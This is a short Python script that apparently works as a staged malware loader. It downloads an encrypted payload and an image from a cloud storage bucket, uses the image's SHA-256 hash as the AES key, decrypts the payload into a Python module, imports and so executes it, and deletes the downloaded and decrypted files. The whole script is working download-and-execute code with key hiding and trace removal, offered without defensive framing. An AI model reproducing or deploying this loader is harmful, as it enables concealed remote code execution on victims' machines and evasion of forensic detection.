import os
import urllib.request

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes

def hashFile(file):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(file)
    return digest.finalize()

def protectModule (module, filename, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(module)
    padded_data += padder.finalize()

    ct = encryptor.update(padded_data) + encryptor.finalize()

    outF = open(filename, "wb")
    outF.write(ct)
    outF.close()

def exposeModule (encryptedModule, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    
    plaintext = decryptor.update(encryptedModule) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(plaintext)
    unpaddedData = data + unpadder.finalize()

    return unpaddedData


prepend = "https://storage.googleapis.com/squirrel_bucket_01/"
url = prepend+"out"
image = prepend+"squirrel.jpg"

urllib.request.urlretrieve(url, "stg1")
urllib.request.urlretrieve(image, "img.jpg")

iv = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"

imgB = open("img.jpg", "rb").read()
os.remove("img.jpg")
hashola = hashFile(imgB)

ct1 = open("stg1", "rb").read()
os.remove("stg1")
emB = exposeModule(ct1, hashola, iv)

emF = open("stg1.py", "wb")
emF.write(emB)
emF.close()
import stg1
os.remove("stg1.py")

stg1.squirrel_print("stage1 downloaded, decrypted and printing...")
